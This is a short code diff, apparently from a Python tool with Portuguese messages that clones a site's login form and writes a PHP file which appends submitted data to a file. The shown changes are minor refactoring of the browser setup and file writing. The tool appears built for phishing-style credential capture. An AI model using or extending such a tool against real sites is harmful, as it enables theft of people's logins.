@@ -24,14 +24,13 @@ file_put_contents($file, $data, FILE_APPEND);\n?>\n
         exit('[-] Não foi possível localizar um formulário de login em: {}'.format(page))
 
     def createBrowser(self):
-        br = mechanize.Browser()
-        br.set_handle_equiv(True)
-        br.set_handle_referer(True)
-        br.set_handle_robots(False)
-        br.set_cookiejar(cookielib.LWPCookieJar())
-        br.addheaders = [('User-agent', self.useragent())]
-        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-        self.browser = br
+        self.browser = mechanize.Browser()
+        self.browser.set_handle_equiv(True)
+        self.browser.set_handle_referer(True)
+        self.browser.set_handle_robots(False)
+        self.browser.set_cookiejar(cookielib.LWPCookieJar())
+        self.browser.addheaders = [('User-agent', self.useragent())]
+        self.browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 
     def useragent(self):
         return 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko'
@@ -99,6 +98,5 @@ file_put_contents($file, $data, FILE_APPEND);\n?>\n
                 self.exit(page)
 
     def php(self):
-        with open('{}'.format(self.loginphp), 'w') as phpfile:
+        with open(self.loginphp, 'w') as phpfile:
             phpfile.write(self.phpsrc.format(self.username, self.password))
-
